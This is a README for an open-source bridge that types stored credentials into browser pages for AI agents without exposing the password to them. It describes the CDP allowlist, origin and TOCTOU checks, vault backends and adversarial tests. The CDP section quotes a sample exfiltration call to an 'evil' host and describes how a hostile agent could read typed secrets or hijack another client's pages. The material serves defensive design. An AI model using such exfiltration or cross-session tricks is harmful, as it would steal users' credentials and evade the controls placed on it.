# 1Claw Browser Bridge

Governed credential fill for AI agents. The agent drives the browser; it never
sees the password.

> **Status: v0.1, private.**
>
> **Built:** the `VaultBackend` trait, `SecretHandle`, the saas driver, the CDP
> allowlist gate, the loopback checks, the Chromium pipe transport (`spawn` with
> fds 3/4 under `--remote-debugging-pipe`), the proxy socket, and the MCP
> toolset, three backends, and governed account registration. 254 tests here,
> eighteen of them against a launched Chromium, two of those driving real Puppeteer and Playwright, plus the vault half.
>
> **The server side is implemented**, end to end:
>
> | Route | Who may call it | What it does |
> | --- | --- | --- |
> | `POST /v1/browser/devices` | a human, behind a step-up re-auth | pins the device key and mints the `bb_` credential, once |
> | `POST /v1/browser/credentials` | a human, behind a step-up re-auth | defines a binding: which secret, and into which hosts |
> | `POST /v1/agents/{id}/browser/sessions` | the human's token **+** `bb_` | opens a session, returns a `bs_` token |
> | `POST /v1/agents/{id}/browser/fills` | the agent's JWT **+** `bb_` **+** `bs_` | checks tab, frame and form-action origins against the binding, applies the velocity cap, records a single-use grant |
> | `POST /v1/agents/{id}/browser/fills/consume` | the human's token **+** `bb_` **+** `bs_`, and **not** an agent | spends the grant and returns the credential |
>
> The split on the last two rows is the invariant in the routing table: the
> agent asks *which* binding, and is refused when it tries to collect the
> answer. There is no feature flag — the endpoints had no implementation
> behind them, which is a different thing from being switched off.
>
> **The bar for shipping** is the adversarial suite green on every backend that
> ships. Three do — hosted, local file, and in-memory — and it is.
>
> That suite is `adversarial.test.ts`: it drives `startBridge`, the entry point
> a real deployment uses, and plays the agent as hostile rather than careless.
> Each of its tests is checked by breaking the control it covers and confirming
> it goes red, because a green suite is evidence about the tests as much as the
> code. In August 2026 the per-file suites passed 121/121 while three controls
> did nothing: the fill window never fired (commands were matched on
> `params.targetId`, which CDP does not use for the methods that read a form
> field), every client received every other client's events, and a listener
> installed before a fill could read the credential typed during it. Every
> component was individually correct; all three bugs were in the seams.
>
> A fourth of the same shape was found writing the suite and is fixed here: the
> TOCTOU generation was bumped under a CDP *session* id and read under a
> *target* id, so the two counters never met and a grant survived the navigation
> it existed to be invalidated by.

## The invariant

**No backend can return a secret through a tool result.** `consumeFill()`
yields a `SecretHandle` — zeroised on disposal, and hostile to every path a
string would take out of the process:

| Path | Behaviour |
| --- | --- |
| `JSON.stringify` | **throws** — this is the MCP result path, so a handle reaching it is a broken control, not a formatting problem |
| `String()`, `` `${h}` ``, `.toString()` | redacted |
| `util.inspect` / `console.log` | redacted |
| `Object.keys` / spread | empty — the bytes are a true private field |
| after `dispose()` | buffer overwritten with zeros; all reads throw |

JavaScript has no destructors, so "zeroise on drop" is explicit: use `using`
(`Symbol.dispose`) or `handle.use(fn)`, which disposes even when `fn` throws —
the failure path being exactly where a live secret tends to get left behind.

## Architecture

The security rules live in the **core** and behave identically on every
backend: origin and frame checks, TOCTOU generation binding, the CDP fill
window, buffer zeroing, velocity limiting.

Drivers own four things and no others: where secrets live, who evaluates
policy, where audit goes, and which capabilities exist.

That split is what makes the invariant reviewable once instead of once per
driver — and it is enforced, not merely intended:
`core-has-no-driver-conditionals.test.ts` fails the build if the core ever
names a driver in code.

```
packages/protocol   wire types shared with the (closed) vault handlers
packages/browser-bridge
  secret-handle.ts  the invariant, as a class
  vault-backend.ts  the trait every driver implements + capability→tool map
  cdp-policy.ts     what an agent's CDP connection may do
  cdp-proxy.ts      the only route from a framework to Chromium
  cdp-transport.ts  the bridge's own connection, behind an interface
  pipe-transport.ts CDP over --remote-debugging-pipe (never a port)
  pipe-codec.ts     NUL-delimited framing, buffered across chunks
  proxy-server.ts   the socket a framework points cdp_url at
  mcp-tools.ts      the status-only tool surface an agent calls
  fill-engine.ts    where every other control is cashed in
  loopback.ts       who may reach the local listeners
  drivers/saas.ts   1Claw-hosted backend
```

### CDP ownership

The bridge is the **only** process attached to Chromium; frameworks reach it
through a gate. If an agent keeps its own CDP connection to the same browser
the bridge types into, the invariant fails in one step — after a fill it reads
`input.value`, the a11y tree, a screenshot, or the `Network` log of the POST.

Filtering responses does not fix that, which is why this gates commands and
events rather than redacting: `btoa(input.value)` and
`fetch('https://evil/?'+v)` never return the value to the agent at all.

It is an **allowlist**. CDP has ~50 domains and gains members every Chromium
release; a denylist is stale the day it is written, and its failure mode is
silent exposure. During a fill the *whole target* is blocked, not just the
field, and push events on it are dropped rather than queued — replaying them
afterwards would hand over exactly what suppression prevented.

**Each client sees only its own pages, on commands as well as events.** Every
client gets its own Chromium `BrowserContext`, and every command naming a
target or a session is checked against what that client owns: `getTargets` is
narrowed to the caller's own pages, and `attachToTarget` on someone else's is
refused even when the id is known. Without that check the isolation is
decorative — one agent lists another's targets, attaches, and runs
`Runtime.evaluate` or `Network.getCookies` against a page it was never granted,
which is the same as being logged in as that user. A test drives that exact
sequence through two sockets on one real Chromium and requires it to fail.

### How it fits together

Four parts, and it is worth being clear which does what:

```
  your agent  ──CDP──▶  bridge  ──▶  Chromium
  (framework)           │  ▲          (the page)
                        │  └── types the credential here
                        ▼
                     backend
             (where the secret lives)
```

- **Your agent** connects to the bridge as if it were Chromium, and drives the
  browser normally. It also calls `request_fill` when it needs a credential.
- **The bridge** owns the browser. Every CDP command from the agent crosses an
  allowlist; nothing else is attached. When a fill is authorised it opens a
  *separate* page the agent has never scripted, navigates to the binding's own
  login URL, types there, and closes it.
- **The backend** decides whether a fill may happen and holds the secret. Three
  ship; they differ only in where secrets live.
- **Chromium** is launched by the bridge over a pipe — no debugging port, which
  would be reachable by the very pages being driven.

The agent receives `{"status":"filled"}`. Not the password. There is no tool
that returns one.

### Pick a backend

| Backend | Secrets live | Needs an account | Use it for |
| --- | --- | --- | --- |
| `MockVaultDriver` | in memory | no | trying it out, tests |
| `LocalVaultDriver` | an encrypted file on your machine | no | your own credentials |
| `SaasDriver` | the 1Claw vault | yes | teams, audit, policy, HITL |

All three enforce the same rules. A backend can refuse a fill; none can widen
what is allowed, because the origin, frame, TOCTOU and CDP checks live in the
core and run identically whichever you choose.

### Try it in one command

No account, no config, no network:

```bash
pnpm install && pnpm build
node packages/browser-bridge/examples/demo.mjs
```

It serves a login form, launches Chromium, asks for a fill, and prints exactly
what the agent received so you can check the password is not in it.

### Your own credentials, no account

The community backend keeps secrets in an AES-256-GCM file, keyed by scrypt
from a passphrase you hold. Nothing leaves your machine.

```bash
export ONECLAW_BRIDGE_VAULT_PASSPHRASE='something long'

1claw-vault init ~/.1claw/vault.json

# The secret comes from stdin, never from an argument — argv is world-readable
# in `ps`, and would land in your shell history too.
printf '%s' 'the-password' | 1claw-vault add ~/.1claw/vault.json \
  --id acme \
  --url https://app.example.com/login \
  --hosts app.example.com

1claw-vault list ~/.1claw/vault.json     # ids and rules; never a secret
```

Then start the bridge against it:

```bash
1claw-browser-bridge --vault ~/.1claw/vault.json --chrome /path/to/chrome
```

**About `--hosts`.** A bare entry matches only itself. `.example.com` — with the
leading dot — matches `example.com` and any subdomain. `*` is refused, because
the matcher has no wildcard: a `*` entry would be stored, match nothing, and
leave you believing a host was allowed.

**About the passphrase.** It is the only thing protecting the file, so scrypt is
tuned to make each guess expensive (N=2¹⁷, ~128 MB). The parameters are stored
in the file *and authenticated*, so nobody can edit them down to something cheap
and still decrypt. There is deliberately no command that prints a secret back
out.

### Creating an account, without the agent knowing the password

The bridge can sign up for a site, generate the password itself, and store it —
with the agent never seeing it. That is `begin_credential_registration`, and it
is available only when a human has written a policy for the site.

```bash
1claw-vault allow-signup ~/.1claw/vault.json \
  --id acme \
  --signup   https://acme.example.com/signup \
  --login    https://acme.example.com/login \
  --username ada@example.com \
  --hosts    acme.example.com \
  --user-sel '#email' --pass-sel '#password' --submit-sel 'button[type=submit]' \
  --success-sel '.dashboard'
```

Then the agent calls the tool with **one argument**:

```jsonc
{ "site_id": "acme" }        // → { "status": "registered", "bindingId": "acme" }
```

**Why so little.** A fill names a binding a human already made, so the host was
someone's decision. A registration has no binding yet — so if the agent named
the host, the agent would be choosing where a credential gets created. The host,
signup URL, username and selectors therefore all come from the policy. The
request type has nowhere to put an alternative.

The bridge generates the password, types it into a page the agent has never
scripted, and only then stores it. The agent gets a binding id back, which it
can use for later fills. It never receives the value at any point.

**Committing is separate from typing, on purpose.** A password stored that the
site never accepted produces a binding that will never work, and you find out
weeks later when a login fails. So the bridge waits for the success signal you
described — `--success-sel`, or the URL changing — and if it does not see one it
**cancels rather than commits**. `{"status":"rejected","reason":"no_success_signal"}`
means nothing was stored.

**How this is tested.** Four tests drive a real Chromium against a real signup
form that enforces a password rule and says no when it is not met: one asserts
the credential stored is byte-for-byte the one the site received, one that a
rejected password stores nothing, one that an unrecognisable outcome stores
nothing, and one that logs in afterwards with what was stored. Breaking the
verdict check so it commits regardless turns two of them red; storing a freshly
generated password instead of the typed one turns the other two red.

Five more go through `startBridge` and the MCP tool itself, because a path
exercised only in pieces is a path nobody has run — that is exactly how a
broken session handshake survived thirty passing production assertions. One of
them passes `signup_url`, `username` and `password` alongside `site_id` and
asserts the signup still happens where the policy says, with the policy's
username. Wiring the tool to honour the agent's url turns it red.

**What it does not do yet.** Email verification. If a site requires clicking a
link in an inbox, this will report `no_success_signal` and store nothing —
correctly, since the account does not exist yet. Whoever reads that email can
complete the signup, so handing it to the agent would undo the point; that needs
its own design rather than a quick addition.

### With the hosted vault

Pair the machine once — a human step, and deliberately so, since the device
being paired is the one that will type secrets into pages:

```bash
curl -sX POST https://api.1claw.co/v1/browser/devices \
  -H "authorization: Bearer $ONECLAW_TOKEN" \
  -d '{"label":"my-laptop","public_key_pin":"<device key>"}'
```

The `bb_` credential comes back once. Then define what may be filled where:

```bash
curl -sX POST https://api.1claw.co/v1/browser/credentials \
  -H "authorization: Bearer $ONECLAW_TOKEN" \
  -d '{"label":"acme","vault_id":"…","secret_path":"acme/password",
       "login_url":"https://app.example.com/login",
       "allowed_hosts":["app.example.com"],"sso_hosts":["login.okta.com"]}'
```

Then:

```bash
export ONECLAW_BRIDGE_CREDENTIAL=bb_…   # this machine
export ONECLAW_TOKEN=…                  # you
export ONECLAW_AGENT_TOKEN=…            # the agent
export ONECLAW_AGENT_ID=…
1claw-browser-bridge --chrome /path/to/chrome
```

Three credentials because the vault requires three distinct facts — which
machine, which person, which agent — and collapsing any two would let one stand
in for another. The bridge refuses to start with any of them missing rather than
failing on the first fill.

`ONECLAW_TOKEN` is worth being clear about: it is your ordinary user credential,
and the bridge process holds it for as long as it runs. That is not a side
effect of the design, it is the design — opening a session and collecting a
credential are things a person authorises, and the alternative is a long-lived
credential that can collect secrets without one. Scope it the way you would any
token on a workstation, and run the bridge as a foreground process you started
rather than a service that outlives your attention. Sessions expire after eight
hours for the same reason.

### What a fill actually does

Worth being precise, because it is not "type into the page you are looking at":

1. The bridge opens a **new page in your agent's own browser context** — one the
   agent has never scripted, so nothing it installed earlier can watch the
   typing.
2. It navigates there using the **binding's** login URL, not anything the agent
   supplied.
3. It waits for the field, focuses it, types the credential, and submits.
4. It waits for the submission to complete, then closes that page.
5. The **session cookie stays**, because cookies belong to the browser context
   rather than the page. Your agent's own tab is now signed in.

So the agent ends up with a session it can use, and never with the password.
`request_fill` returns `{"status":"filled"}` and nothing else.

That last part only works because the throwaway page is opened in the agent's
context. A fill in the default context logs in somewhere the agent cannot
reach — which is what this did until it was tested end to end.

### Connecting your agent

Point your framework's `cdp_url` at the URL the bridge prints. Every command
crosses the gate; nothing else is attached to Chromium.

**Stock clients work, and a test proves it with the real clients.** Puppeteer
and Playwright could not connect at all for a while. Their handshake asks the
browser to describe itself and then to start announcing targets, and the second
half is refused by design: forwarding `Target.setAutoAttach` or
`setDiscoverTargets` puts Chromium into a mode where it reports *every* target
to whoever asked.

The proxy answers that handshake itself, so the client is satisfied without
Chromium ever being put into global discovery, and attaches on the client's
behalf so the session it is handed is real and recorded as its own. Two of the
tests drive actual `puppeteer-core` and `playwright-core` through
connect → newPage → goto against a launched Chromium, because a hand-built
client cannot tell you whether a real one is happy.

```js
await puppeteer.connect({ browserWSEndpoint: bridge.url });
await chromium.connectOverCDP(bridge.url);
```

`examples/agent.mjs` shows the minimal client if you would rather speak gated
CDP directly.

### Loopback

`127.0.0.1` is not a boundary: every page in the browser being driven can reach
it. Any request carrying an `Origin` is refused — not just cross-site ones,
because localhost-to-localhost is *same*-site and `Sec-Fetch-Site` would pass
it. Plus a literal-loopback `Host` check for DNS rebinding, and a per-session
token compared in constant time.

### The agent's surface

`request_fill` asks the bridge to type a credential. It does not return one —
the agent learns whether the fill happened, never what was typed. There is
deliberately no tool that returns credential material, because a tool that
could would be the shortest path around everything else here.

Its schema takes a `binding_id` and nothing else. No url, because the bridge
navigates to the binding's own `login_url` rather than letting an agent choose
which page receives the credential. No value, because the agent never supplies
the secret. Page state is observed by the bridge, not accepted as an argument.

Denials come back as a closed-set reason. Free text would reach an agent that
will try to argue with it, and risks naming which credential exists.

### Ordering, in the fill engine

The sequence is the design, not a style:

1. **Block the agent first**, before the secret exists in this process — doing
   it after leaves a gap where the agent can watch the typing it is about to be
   blocked from watching.
2. **Navigate to the binding's own `login_url`.** An agent that picks the URL
   picks who receives the password.
3. **Re-check the generation immediately before typing.** Authorisation
   happened earlier; if the page moved since, the credential lands in whatever
   loaded instead. The TOCTOU gap is closed at the last moment, not the first.
4. **Type from the handle, then dispose.**
5. **Close the window in `finally`** — the failure path is exactly where a
   half-open window would persist and lock the agent out of its own browser.

Each step is pinned by a test that a mutation confirms bites.

### Capability gating

Tools are **absent**, not disabled. A tool that exists and always fails teaches
an agent to retry, and puts a runtime upsell in agent-visible output. On the
community backend `request_checkout` is simply not registered.

## Develop

```bash
pnpm install
pnpm typecheck       # tsc -b across the workspace
pnpm typecheck:tests # the tests, which the build config excludes
pnpm test            # vitest
pnpm verify          # all three, as CI runs them
```

The tests get their own typecheck pass because the build config excludes them
from `dist`, which left them unchecked entirely. `startBridge({ args })` was
being passed by three test files against an options type that never declared
it — dropped in silence, and only fatal on a machine with no display.

The suite includes mutation-verified guards. Each of these fails a specific
test rather than passing quietly: making `toJSON` return plaintext, removing
the buffer zeroing, adding `if (backend === "saas")` to the core, letting the
CDP gate allow unknown methods, not blocking the target during a fill, and
rejecting only cross-site `Origin`s.

## Roadmap

- **v0.1** (here) — `VaultBackend` + `SecretHandle` + saas driver + CDP allowlist gate + loopback checks + Chromium pipe transport + per-client `BrowserContext` + MCP stdio + the composition root and `1claw-browser-bridge` bin. Vault side: device pairing and revocation, binding CRUD with form fingerprints, sessions, fill authorisation and single-use grant consumption. Adversarial suite, and three tests against a real Chromium.
- **OSS launch** — the gate was the adversarial harness passing against the saas driver. It does, and the vault half is implemented rather than flagged off, so the client is exercised end to end today (30 assertions against production). Form-action and fingerprint checks are done. What remains is a **mock-vault** so someone without a 1Claw account can run the thing — a real gap for a public repo, since the only backend that exists talks to an API they cannot reach.

  **Done.** `MockVaultDriver` is an in-memory backend, and
  `examples/demo.mjs` runs the whole thing with no account: a local login form,
  a real Chromium, and the agent's tool result printed so you can check the
  password is not in it.

  ```bash
  pnpm install && pnpm build && node packages/browser-bridge/examples/demo.mjs
  ```

  The community driver has landed too: `LocalVaultDriver`, an AES-256-GCM file keyed by scrypt from a passphrase you hold, with `1claw-vault` to manage it. Three backends now ship, and the adversarial suite is green on all of them — which was always the real bar.
- **v0.2** — governed credential registration **(done, local backend)**; HITL approval queue, TOTP fill, and registration on the hosted backend still to come
- **v0.3** — cloud-runtime sidecar (platform trust model)

## Security

The threat model, the CDP ownership argument and the adversarial test matrix
live in the 1Claw browser-bridge spec. Report vulnerabilities to
security@1claw.co rather than opening an issue.

Apache-2.0.
